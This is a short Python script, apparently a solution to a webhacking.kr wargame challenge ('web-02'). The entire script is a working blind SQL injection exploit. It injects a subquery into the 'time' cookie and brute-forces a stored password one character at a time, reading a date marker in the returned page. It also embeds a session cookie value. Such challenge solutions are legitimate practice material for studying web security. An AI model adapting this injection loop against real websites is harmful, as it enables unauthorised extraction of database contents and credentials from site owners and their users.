import urllib.request, re


my_cookie = "8f2fdcbde7d429caaa5607a1e7b7b67f"
pw = ""

for i in range(1, 10):

    for j in range(33,126):
        url = "http://webhacking.kr/challenge/web/web-02/"
        req = urllib.request.Request("http://webhacking.kr/challenge/web/web-02/")
        req.add_header("Cookie","time=1432644376 and (select ascii(substring(password,%d,1)) from FreeB0aRd)=%d; PHPSESSID=%s" %(i,j,my_cookie))
        read = urllib.request.urlopen(req).read().decode('iso-8859-1')
        find = re.findall("<!--2070-01-01 09:00:01-->",read)


        if find:
            pw = pw + chr(j)
            print("find  FreeB0aRd  password : " + pw)


print("Find FreeB0aRd  Password is : %s" %(pw))
